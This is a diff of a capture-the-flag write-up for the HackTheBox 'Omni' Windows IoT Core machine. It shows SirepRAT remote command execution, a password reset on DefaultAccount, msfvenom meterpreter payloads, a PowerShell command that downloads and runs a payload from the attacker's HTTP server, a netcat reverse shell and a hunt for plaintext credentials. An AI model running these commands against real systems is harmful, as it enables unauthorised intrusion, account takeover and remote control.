@@ -47,6 +47,7 @@ When visiting 10.10.10.204:8080, a prompt shows up asking for credentials. It al
 A little bit of research connects this type of setup to some sort of Windows IoT Core technology. 
 https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf
 
+## Exploitation 
 Interestingly, there is a RAT already implemented for Windows 10 IoT Core devices on GitHub. 
 https://github.com/SafeBreach-Labs/SirepRAT
 This could be the key. (However, it is in Python 2, kind of annoying but doable with virtual environments)
@@ -134,56 +135,14 @@ The command completed with one or more errors.
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 <OutputStreamResult | type: 11, payload length: 338, payload peek: 'User accounts for \\------------------------'>
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
-
-(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c net user DefaultAccount password" --v
----------
-The command completed successfully.
-
-
----------
-<HResultResult | type: 1, payload length: 4, HResult: 0x0>
-<OutputStreamResult | type: 11, payload length: 39, payload peek: 'The command completed successfully.'>
-<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
-
 ```
-Now the user for the IoT device DefaultAccount has its password changed to 'password' and this can be used in the web login 10.10.10.204:8080 as found previously. However, although this opens access to the web dashboard, note that DefaultAccount is just a regular user and NOT part of the Administrators group. From this point on, there is a command line included within the web application (Sidebar->Processes->Run command), so the SirepRAT use for command line execution can be replaced in some ways using the web CLI. 
+
+Now is the time for a reverse shell, but first, some preliminary info about the Kali and the Omni machines are needed. 
 
 ```
 (myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c net localgroup Administrators" --v
----------
-Alias name     Administrators
-Comment        Administrators have complete and unrestricted access to the computer/domain
-
-Members
-
--------------------------------------------------------------------------------
-Administrator
-The command completed successfully.
-```
-
-```
-Command> wmic OS get OSArchitecture
-
+└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c wmic OS get OSArchitecture" --v
 OSArchitecture                = 64-bit
-```
-
- ?? THIS IS NOT WORKING! THE FILES ARE THE SAME SIZE??
- ?? Then, upload mimikatz binary files (3 of them) to the system32 directory using SirepRAT.
- ?? Note: use string=$(cat file) and then pass that string into the "data" flag of SirepRAT.
-
-Ok, trying to get a reverse shell now for convenience. 
-```
-msf6 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.247 -f exe -o /tmp/payload.exe
-[*] exec: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.247 -f exe -o /tmp/payload.exe
-
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-[-] No arch selected, selecting arch: x86 from the payload
-No encoder specified, outputting raw payload
-Payload size: 354 bytes
-Final size of exe file: 73802 bytes
-Saved as: /tmp/payload.exe
 ```
 
 ```
@@ -211,51 +170,15 @@ Saved as: /tmp/payload.exe
        valid_lft forever preferred_lft forever
 
 ```
+Now we know that: 
+The Omni machine is running on a 64-bit architecture. 
 The IP of the Kali machine (on the VPN) is 10.10.14.247. 
-Again, the IP of the Omni machine is (still) 10.10.10.204
+The IP of the Omni machine is (still) 10.10.10.204
 
-Now, setting up an HTTP server to upload payload (/tmp/payload.exe) for reverse shell.
-```
-msf6 exploit(multi/handler) > msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.247 LPORT=4444 -f exe -o /tmp/payload.exe
-[*] exec: msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.247 LPORT=4444 -f exe -o /tmp/payload.exe
-
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
-No encoder specified, outputting raw payload
-Payload size: 510 bytes
-Final size of exe file: 7168 bytes
-Saved as: /tmp/payload.exe
-
-┌──(kali㉿kali)-[/tmp]
-└─$ python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
-(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command Invoke-WebRequest -Uri http://10.10.14.247:8000/payload.exe -Outfile C:\Windows\system32\payload.exe"
-
-<HResultResult | type: 1, payload length: 4, HResult: 0x0>
-
-msf6 > use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
-payload => windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set lhost 10.10.14.247
-lhost => 10.10.14.247
-msf6 exploit(multi/handler) > set lport 4444
-lport => 4444
-msf6 exploit(multi/handler) > run
-
-[*] Started reverse TCP handler on 10.10.14.247:4444 
-
-(myvenv) ┌──(kali㉿kali)-[~/Downloads/SirepRAT]
-└─$ python SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell.exe -command C:\Windows\system32\payload.exe"
-```
-The above is not working (firewall?) :( Maybe it's time to read some hints. 
-However, here is my guess on the next steps. First, get shell. Then, mimikatz and crack password hashes. ??? Profit (get the flags for each user). Done. 
-(Looking at the hints, it seems much simpler than mimikatz, although it might be cool to do that for fun...)
-
-Let's try to open a reverse shell with netcat instead of metasploit. 
-First, download a 64-bit version of netcat and "upload" it to the remote machine.
-To do this, set up a temporary HTTP server and download the file from the remote machine.  
+## Post-Exploitation
+Let's try to open a reverse shell with netcat. 
+First, we need to download a 64-bit version of netcat and "upload" it to the remote machine.
+To do this, set up a temporary HTTP server on Kali to serve the binary and download the file from the remote machine and run it using SirepRAT.   
 
 ```
 ┌──(kali㉿kali)-[~/Downloads/netcat_64]
@@ -295,11 +218,12 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\windows\system32> 
 ```
 
+## Privilege Escalation
 Now it's time for MORE enumeration... 
 Just by cd'ing around, there are interesting files in the Users folder of C:\Data\Users (for admin and app)
-I just need to find the creds for the corresponding accounts to decrypt the flags. 
-
-Maybe there is a lazy sysadmin that left some hidden files with clues? Note that I tried the following also with .xml, .txt, .ini, .ps1, .cmd, .btm, and so on. 
+We just need to find the creds for the corresponding accounts to decrypt the flags. 
+The very first step is to check if there are any plaintext credentials lying hidden somewhere. 
+Note that the following was also tried with .xml, .txt, .ini, .ps1, .cmd, .btm, and so on. (typical sysadmin files)
 
 ```
 PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> Get-ChildItem C:\*.bat -Recurse -Force | Select-String -Pattern administrator
@@ -332,7 +256,7 @@ GOTO :LOOP
 :EXIT
 ```
 
-Using these credentials, we are now able to login to the web interface and access the Run Command feature with elevated privileges. This will allow opening a reverse shell with the associated privileges depending on the account. 
+Using these credentials, we are now able to login to the web interface and access the Run Command feature with elevated privileges. This will allow opening a reverse shell with the associated privileges depending on the account used. 
 
 Using a similar approach as above, set up a netcat listen on the Kali machine and run (in the Run Command web UI): 
 
@@ -384,8 +308,4 @@ $credential.GetNetworkCredential().Password
 5dbdce5569e2c4708617c0ce6e9bf11d
 ```
 
-These are the flags for each user, and this is where the journey ends for now. 
-
-## Vulnerability Assessment
-## Exploitation
-## Conclusions
+These are the flags for each user, and with that, the machine is officially pwned. 
